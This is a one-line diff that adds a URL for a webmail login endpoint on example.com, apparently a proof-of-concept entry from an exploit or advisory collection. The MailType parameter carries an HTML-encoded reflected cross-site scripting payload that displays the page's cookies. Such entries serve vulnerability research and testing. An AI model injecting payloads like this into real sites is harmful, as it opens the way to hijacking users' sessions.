@@ -1,0 +1,1 @@
+http://www.example.com/index.php/mail/auth/processlogin?emailName=&amp;lt;emailName&amp;gt;&amp;amp;emailDomain=&amp;lt;emailDomain&amp;gt;&amp;amp;cssStyle=original&amp;amp;email=&amp;lt;email&amp;gt;password=&amp;lt;password&amp;gt;&amp;amp;requestedServer=&amp;amp;MailType=&amp;lt;script&amp;gt;alert(document.cookie);&amp;lt;/script&amp;gt;
